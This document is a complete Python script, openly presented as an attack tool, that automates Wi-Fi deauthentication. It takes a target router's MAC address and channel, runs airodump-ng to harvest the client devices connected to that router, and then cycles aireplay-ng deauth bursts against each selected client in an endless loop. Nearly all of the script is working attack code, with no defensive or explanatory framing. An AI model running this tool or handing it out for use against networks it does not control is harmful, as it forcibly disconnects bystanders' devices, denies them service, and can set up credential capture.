import os
import subprocess
import time
import sys

def show_banner(phase_title):
    banner = f"""
    ======================================================
    #                 _ _ _ _                            #
    #                / \ \ \ \                           #
    #               |  | | | |                           #
    #            _  |  |_|_|_|                           #
    #           / \ |  | | | |                           #
    #          |   \|  | | | |                           #
    #          |    |  |_|_|_|                           #
    #          |    |  | | | |                           #
    #          |    \  /_/_/_/                           #
    #           \    `-.  /                              #
    #            \      _/                               #
    #             |    |                                 #
    ======================================================
"""
    print(banner)

def check_root():
    if os.geteuid() != 0:
        print("[-] Error: This script must be run with 'sudo'.")
        sys.exit(1)

def get_manual_inputs():
    show_banner("Interactive Initialization Setup")
    
    interface = input("[?] Enter your monitor mode interface (e.g., wlan0mon): ").strip()
    while not interface:
        interface = input("[-] Interface cannot be empty. Try again: ").strip()

    router_mac = input("[?] Enter the TARGET ROUTER MAC (BSSID): ").strip()
    while not router_mac:
        router_mac = input("[-] Router MAC cannot be empty. Try again: ").strip()

    channel = input("[?] Enter the target router's channel (e.g., 1, 6, 11, 36): ").strip()
    while not channel:
        channel = input("[-] Channel cannot be empty. Try again: ").strip()

    return interface, router_mac, channel

def parse_clients_from_csv(csv_prefix, router_mac):
    csv_file = f"{csv_prefix}-01.csv"
    clients = set()
    if not os.path.exists(csv_file):
        return clients
    try:
        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
        station_section = False
        for line in lines:
            if "Station MAC" in line:
                station_section = True
                continue
            if station_section and line.strip():
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 6:
                    client_mac = parts[0]
                    associated_bssid = parts[5]
                    if len(client_mac) == 17 and associated_bssid.lower() == router_mac.lower():
                        if not client_mac.startswith("33:33") and not client_mac.startswith("01:00"):
                            clients.add(client_mac.upper())
    except Exception:
        pass
    return clients

def main():
    check_root()
    interface, router_mac, channel = get_manual_inputs()
    output_prefix = "/tmp/airodump_scan"
    
    for ext in ["-01.csv", "-01.kismet.csv", "-01.kismet.netxml", "-01.log.csv"]:
        if os.path.exists(f"{output_prefix}{ext}"):
            os.remove(f"{output_prefix}{ext}")

    print(f"\n[*] Tuning {interface} to Channel {channel}...")
    subprocess.run(["iw", "dev", interface, "set", "channel", channel], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # ==========================================
    # PHASE 1: SCANNING CLIENTS
    # ==========================================
    print("\n" + "•" * 55)
    print("  [⚡] PHASE 1: CLIENT HARVESTING ENGINE ACTIVE")
    print(f"  [+] Target Router : {router_mac}")
    print(f"  [+] Channel       : {channel}")
    print("  [*] Running live scan... Press CTRL+C at ANY TIME to stop scanning.")
    print("•" * 55 + "\n")

    cmd_scan = ["airodump-ng", "--bssid", router_mac, "-c", channel, "-w", output_prefix, "--output-format", "csv", interface]
    scan_process = subprocess.Popen(cmd_scan, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    start_time = time.time()
    try:
        while True:
            elapsed = int(time.time() - start_time)
            current_found = parse_clients_from_csv(output_prefix, router_mac)
            count = len(current_found)
            sys.stdout.write(f"\r[*] Time: {elapsed}s | Devices Discovered: [{count}] | Press Ctrl+C to lock targets ")
            sys.stdout.flush()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n[!] Ctrl+C intercepted! Halting scanning sequence...")

    scan_process.terminate()
    scan_process.wait()

    print("[*] Processing final traffic logs...")
    discovered_clients = list(parse_clients_from_csv(output_prefix, router_mac))

    if not discovered_clients:
        print("\n[-] No client devices found connected during the scan window.")
        print("[!] Aborting phase since targets list is empty.")
        sys.exit(0)

    for ext in ["-01.csv", "-01.kismet.csv", "-01.kismet.netxml", "-01.log.csv"]:
        if os.path.exists(f"{output_prefix}{ext}"):
            os.remove(f"{output_prefix}{ext}")

    # ==========================================
    # USER ACCEPTANCE GATE & TARGET FILTERING
    # ==========================================
    print("\n" + "═" * 55)
    print("  ⚠️  PENDING ATTACK APPROVAL")
    print(" ═" * 55)
    print(f"  [+] Target Router : {router_mac}")
    print(f"  [+] Connected Targets Found:")
    for idx, client in enumerate(discovered_clients, 1):
        print(f"      {idx}. {client}")
    print(" ═" * 55)
    
    # 1. Prompt for duration
    attack_duration = 5
    user_time_input = input("\n[?] Enter attack duration in seconds (Press [ENTER] for default 5s): ").strip()
    if user_time_input.isdigit():
        attack_duration = int(user_time_input)
        print(f"[+] Attack duration updated to: {attack_duration} seconds.")
    else:
        print(f"[+] Using default attack duration: 5 seconds.")
    
    # 2. Prompt for targets to skip
    skip_input = input("[?] Enter target numbers to skip, separated by commas (e.g., 2 or 2,5,3) or press [ENTER] to target all: ").strip()
    
    indices_to_skip = set()
    if skip_input:
        # Split by comma and filter out non-numeric entries
        for parts in skip_input.split(","):
            clean_part = parts.strip()
            if clean_part.isdigit():
                indices_to_skip.add(int(clean_part))

    # Rebuild the attack list excluding skipped choices
    attack_queue = []
    for idx, client in enumerate(discovered_clients, 1):
        if idx in indices_to_skip:
            print(f"[-] Excluding target {idx}: {client}")
        else:
            attack_queue.append(client)

    if not attack_queue:
        print("\n[-] All discovered targets were skipped. Nothing left to attack.")
        sys.exit(0)

    print("\n[*] Initializing tactical transition...")
    time.sleep(2)
    os.system('clear')

    # ==========================================
    # PHASE 2: ATTACK MATRIX (DEAUTH AUTOMATION)
    # ==========================================
    show_banner("Phase 2: Active Injection Matrix")
    print("\n" + "•" * 55)
    print("  [⚡] DOUBLE-ENGINE INJECTION MATRIX ACTIVE")
    print(f"  [+] Interface       : {interface} (Locked on CH {channel})")
    print(f"  [+] Target Router AP: {router_mac}")
    print(f"  [+] Targets Enqueued: {len(attack_queue)} active client(s) (after exclusions)")
    print(f"  [+] Burst Duration  : {attack_duration}s per target loop")
    print("" + "•" * 55 + "\n")

    print("[*] Launching permanent airodump-ng tracking loop...")
    airodump_cmd = ["airodump-ng", "-c", channel, interface]
    airodump_process = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    packet_count = "60" 

    try:
        while True:
            for client_mac in attack_queue:
                print(" ┌──────────────────────────────────────────────────┐")
                print(f"   📡 TRACKING SYSTEM : [AIRODUMP-NG ACTIVE ON CH {channel}]")
                print(f"   🔓 TARGET ROUTER   : {router_mac}")
                print(f"   🎯 TARGET CLIENT   : {client_mac}")
                print(" └──────────────────────────────────────────────────┘")
                print("[*] --- LIVE AIREPLAY-NG OUTPUT ---")

                aireplay_cmd = [
                    "aireplay-ng", 
                    "-0", packet_count, 
                    "-a", router_mac, 
                    "-c", client_mac, 
                    "--ignore-negative-one",
                    interface
                ]

                aireplay_process = subprocess.Popen(aireplay_cmd)
                
                try:
                    aireplay_process.wait(timeout=attack_duration)
                except subprocess.TimeoutExpired:
                    aireplay_process.terminate()
                    aireplay_process.wait()

                print("\n[✔] Burst session complete.\n" + "-"*50)
                time.sleep(1)

            print(f"[*] Full loop finished. Re-cycling in 3 seconds... (Press Ctrl+C to Exit completely)")
            time.sleep(3)

    except KeyboardInterrupt:
        print("\n[-] Final termination signal received. Tearing down systems...")
        airodump_process.terminate()
        airodump_process.wait()
        sys.exit(0)

if __name__ == "__main__":
    main()
